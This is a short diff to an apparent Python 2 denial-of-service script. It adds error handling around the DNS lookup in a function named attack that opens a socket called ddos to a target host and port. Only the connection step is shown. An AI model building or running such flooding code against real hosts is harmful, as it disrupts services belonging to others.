@@ -14,7 +14,11 @@ def dos(host, port, duration, pause):
 
 
 def attack(host, port):
-    ip = socket.gethostbyname(host)
+    print host
+    try:
+        ip = socket.gethostbyname(host)
+    except:
+        return "Failed to gethostbyname"
     ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         ddos.connect((host, int(port)))
